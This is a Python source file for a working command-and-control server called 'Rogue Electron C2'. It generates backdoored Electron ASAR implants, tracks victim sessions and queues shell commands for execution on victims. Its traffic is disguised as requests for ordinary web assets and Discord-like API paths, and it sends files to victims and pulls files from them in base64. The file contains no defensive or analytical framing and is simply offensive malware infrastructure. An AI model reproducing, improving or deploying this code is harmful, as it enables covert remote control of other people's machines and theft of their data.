from typing import *
from fastapi import FastAPI, Request
from fastapi.responses import PlainTextResponse
import base64
import os
import keyboard
import readline
import threading
import uvicorn
from asargen import createAsarFile


class SESSION:
    def __init__(self):
        self.data = {
            'ID': None,
            'Address': None,
            'Platform': None
        }

    def set_info(self, ID=None, Address=None, Platform=None):
        if ID:
            self.data['ID'] = ID
        if Address:
            self.data['Address'] = Address
        if Platform:
            self.data['Platform'] = Platform
    
    def get_info(self, field):
        return self.data.get(field, "Field not found")

    def display(self):
        return self.data
 
ADDRESS: str = "127.0.0.1"
PORT: int = 1337
CMD_HISTORY: List[str] = []
HISTORY_INDEX: int = -1
CMD_QUEUE: List[str] = []
PAUSE_CMDS: bool = False

SESSIONS: List[SESSION] = []

CURRENT_SESSION: str = "none"

app = FastAPI()

global_lock = True
global_connection = False

cmdRequests = [
"bootstrap.js",
"index.html",
"styles.css",
"app.css",
"discord.js",
"teams.js",
"app.js",
"channels.json",
"messages.json",
"user_settings.json",
"profile_picture.png",
"emoji.gif",
"fontawesome.woff",
"roboto.woff2",
"voice_message.mp3",
"video_attachment.mp4",
"icon.svg",
"manifest.json"
]

outputRequests = [
"api/v9/channels/{channel_id}/messages",
"api/v9/channels/{channel_id}/messages/attachments",
"api/v9/users/@me/settings",
"api/v9/guilds/{guild_id}/channels",
"api/v9/invite/{invite_code}",
"api/v9/oauth2/token",
"api/v9/users/@me/avatar",
"api/v9/channels/{channel_id}/messages/bulk-delete",
"api/v9/applications/{application_id}/commands",
"api/v9/users/@me/guilds"
]

clients = []

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def fancyprint(text: str):
    print("\r" + text + "\n$ ", end="")

def handle_up_arrow():
    global HISTORY_INDEX
    if len(CMD_HISTORY) > 0 and HISTORY_INDEX > 0:
        HISTORY_INDEX -= 1
        readline.set_startup_hook(lambda: readline.insert_text(CMD_HISTORY[HISTORY_INDEX]))
        readline.redisplay()

def handle_down_arrow():
    global HISTORY_INDEX
    if len(CMD_HISTORY) > 0 and HISTORY_INDEX < len(CMD_HISTORY) -1:
        HISTORY_INDEX += 1
        readline.set_startup_hook(lambda: readline.insert_text(CMD_HISTORY[HISTORY_INDEX]))
        readline.redisplay()
 
def checkIfNewClient(client, sessionID, platform):
    if (client not in clients) and (global_lock == False):
        clients.append(client)
        print(f"\n{bcolors.OKGREEN}[!]{bcolors.ENDC} New session: {sessionID}\n")
        session = SESSION()
        session.set_info(ID=sessionID, Address=client, Platform=platform)
        SESSIONS.append(session)
        
        global global_connection
        global_connection = True

def getIP(request: Request) -> str:
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        client_ip = forwarded.split(',')[0].strip()
    else:
        client_ip = request.client.host
    return client_ip

@app.get("/upload.php/{file:path}", response_class=PlainTextResponse)
async def upload_file(file: str, request: Request):
    client = getIP(request)
    if client == CURRENT_SESSION:
        print("get upload")
        data = encodeFile(file)
        return data

@app.get("/cookie_id={sessioninfo:path}", response_class=PlainTextResponse)
async def session_initiate(sessioninfo: str, request: Request):
    client = getIP(request)
    sessionid = sessioninfo.split(',')[0]
    platform = sessioninfo.split(',')[1]
    checkIfNewClient(client, sessionid, platform)
    return "Connection Initiated"

@app.post("/upload.php/{file:path}")
async def download_file(file: str, request: Request):
    client = getIP(request)
    if client == CURRENT_SESSION:
        data: dict = await request.json()
        #print(file, data["result"])
        decodeFile(file, data["result"])

@app.get("/{path:path}", response_class=PlainTextResponse)
async def get_command(path: str, request: Request):

    client = getIP(request)

    if path in cmdRequests and client == CURRENT_SESSION: 
        if len(CMD_QUEUE) == 0:
            return "204 - No Content"
        cmd: str = CMD_QUEUE.pop(0)
        fancyprint(f"Running '{cmd}' on {client}...")
        CMD_HISTORY.append(cmd)
        return cmd

@app.post("/{path:path}")
async def send_output(path: str, request: Request):
    client = getIP(request)

    if path in outputRequests and client == CURRENT_SESSION:
        data: dict = await request.json()
        if "Session:" in data["result"]:
            sessionid = data["result"].lstrip("Session:")
            print(f"\nSessionID: {sessionid}")
        else:
            fancyprint("Output:")
            fancyprint(data["result"])

def encodeFile(filePath):
    with open(filePath, 'rb') as file:
        content = file.read()
        encoded = base64.b64encode(content)
        return encoded

def decodeFile(filePath, content):
    decoded = base64.b64decode(content)
    with open(filePath, 'wb') as file:
        file.write(decoded)

def clearScreen():
    print("\033[H\033[J", end="")
 
def printHeader():
    print(f"""{bcolors.FAIL} 
                                            
                           #############                           
                        ###################                        
                      ########## # ##########                      
                    ############# #  ##########                    
                    #####      ####       #####                    
                   ####  #####    #### ###  ####                   
                  #####  ###  ######## #### #####                  
                  ###### #  ########## ### ######                  
                  ######  ######   ###    #######                  
                  #####  #  ########## ##########                  
                   ####   ##   ####### ##   ####                   
                    ###   ######    ## ##   ###                    
                    #########  #####    #######                    
                      ########  ##   ########                      
                        ###################                        
                           #############                           
                                                                      
    {bcolors.ENDC}""")
    print("                         Rogue Electron C2")
    print("\n")

def generateAsar():
    ADDRESS = input("Enter server IP address: ")

    asarFile = ""

    while asarFile == "":
        asarFile = input("Please provide an ASAR archive: ")
        if os.path.exists(asarFile):
            break
        else:
            print(f"{asarFile} is not a valid ASAR archive, please provide a valid ASAR archive.")
            asarFile = ""

    createAsarFile(asarFile, ADDRESS, PORT)
    print("Successfully created implant \"Output/app.asar!\"")

def listSessions():
    print(f"\n{len(SESSIONS)} Active Session(s):")
    for i, session in enumerate(SESSIONS):
        print(f"\n{i} - [{bcolors.OKGREEN}ACTIVE{bcolors.ENDC}]") 
        print(f"\tSession ID: {session.get_info('ID')}")
        print(f"\tIP Address: {session.get_info('Address')}")
        print(f"\tPlatform: {session.get_info('Platform')}")
        print("\n")

def selectSession(choice):
    global CURRENT_SESSION
    # select session
    while CURRENT_SESSION == "none":
        sessionChoice = choice
        for i, session in enumerate(SESSIONS):
            if sessionChoice == session.get_info('ID') or (sessionChoice.isdigit() and int(sessionChoice) == i):
                CURRENT_SESSION = session.get_info('Address')
                print(f"Selected session: {session.get_info('ID')}")
                break
            else:
                sessionChoice = ""
                print("Please select a valid session.")

def input_thread():
    printHeader()
    portSet = False
    customPort = ""
    

    while portSet == False:
        customPort = input("Enter a port number to listen on or leave blank to use default (1337): ")
        if customPort.strip() == "":
            PORT = 1337
            portSet = True
        elif not customPort.isdigit():
            print("Port must be an integer!!")
        else:
            PORT = customPort
            portSet = True
        
    print(f"Starting listener on port: {PORT}!")

    asarchoice = ""

    while asarchoice != "y" or asarchoice != "n":
        asarchoice = input("Would you like to generate asar implant file? (y or n): ")
        if asarchoice == "y":
            generateAsar()
            break
        elif asarchoice == "n":
            break
        else:
            print("Please enter y or n")

    global global_lock
    global_lock = False

    global global_connection
    global HISTORY_INDEX

    print("Waiting for client...")

    while True:
        new_cmd = ""
        selection = ""

        keyboard.on_press_key("up", lambda _: handle_up_arrow())
        keyboard.on_press_key("down", lambda _: handle_down_arrow())

        #keyboard.on_press_key("up", print("up"))

        global CURRENT_SESSION
        """
        while global_CURRENT_SESSION == "none":
            print("\nSessions:")
            
            sessionChoice = input("\nPlease select a session: ")
            if sessionChoice in SESSIONS:
                CURRENT_SESSION = sessionChoice
                print(f"Using session {CURRENT_SESSION}.")
                break
            elif int(sessionChoice) < len(SESSIONS):
                CURRENT_SESSION = SESSIONS[int(sessionChoice)]
                print(f"Using session {CURRENT_SESSION}.")
                break
            else:
                print("Please specify a valid session.")
        """            
        """
        while len(SESSIONS) == 0:
            if len(SESSIONS) > 0:
                break
        """
        

        while selection == "":
            selection = input("$ ")
            if selection.strip() == "sessions":
                # list sessions
                if CURRENT_SESSION == "none" and len(SESSIONS) != 0:
                    listSessions()
                    selection = ""
                else:
                    print("There are currently no active sessions.")
            elif selection.split(' ')[0] == "use":
                choice = selection.split(' ')[1]
                selectSession(choice)
                break
            elif selection == "help":
                print(f"""
    - use \"sessions\" to list current sessions.
    - use \"use\" to select a session (either by session number or session ID).
    - use \"help\" to view this help message.
    - use \"exit\" to exit.
                      """)
                selection = ""
            elif selection == "exit":
                print("Exitting...")
                # You're welcome :)
                os.system(f"kill {os.getpid()}")
                while True: pass
            else:
                print("Please enter a valid command.")
                selection = ""

        

        
    
        if global_connection and CURRENT_SESSION != "none":
            new_cmd = input("$ ").lower()
        #help
        if new_cmd == "help":
            print("""Run a command on the victim or
    - use \"getpid\" to get the process ID of the implant.
    - use \"kill\" to kill the implant.
    - use \"history\" to view command history.
    - use \"clear\" to clear the screen
    - use \"help\" to view this help message.
    - use \"exit\" to exit.
            """)
        #history
        elif new_cmd == "history":
            print("History:")
            for cmd in CMD_HISTORY:
                print("  " + cmd)
        #queue
        elif new_cmd == "queue":
            if len(CMD_QUEUE) == 0:
                print("Queue Empty.")
            else:
                print("Queue:")
                for cmd in CMD_QUEUE:
                    print("  " + cmd)
        #exit
        elif new_cmd == "exit":
            print("Exitting...")
            # You're welcome :)
            os.system(f"kill {os.getpid()}")
            while True: pass
        #banner
        elif new_cmd == "banner":
            printHeader()
        elif new_cmd == "clear" or new_cmd == "cls":
            clearScreen()
        #execute command on victim
        elif new_cmd.strip() != "":
            CMD_QUEUE.append(new_cmd)
            HISTORY_INDEX = len(CMD_HISTORY)
        #commands queued up
        if len(CMD_QUEUE) > 1:
            print(f"Added '{new_cmd}' to queue...")


threading.Thread(target = input_thread).start()
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="critical", ssl_keyfile="TLS/key.pem", ssl_certfile="TLS/cert.pem") #start web server on current host (0.0.0.0) using the PORT variable
